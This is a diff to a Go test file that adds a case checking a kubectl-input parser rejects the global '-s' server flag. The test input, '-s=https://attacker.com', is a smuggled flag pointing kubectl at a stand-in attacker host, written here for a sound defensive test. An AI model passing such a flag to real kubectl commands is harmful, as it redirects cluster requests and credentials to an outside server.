@@ -245,4 +245,10 @@ func TestParseKubectlInput_GlobalFlagDenylist(t *testing.T) {
 			t.Errorf("expected no rejection for --since, got %v", err)
 		}
 	})
+	t.Run("short -s with equals form", func(t *testing.T) {
+		_, err := parseKubectlInput(json.RawMessage(`{"command":["get","pods","-s=https://attacker.com"]}`))
+		if err == nil || !strings.Contains(err.Error(), "-s") {
+			t.Errorf("expected rejection naming -s, got %v", err)
+		}
+	})
 }
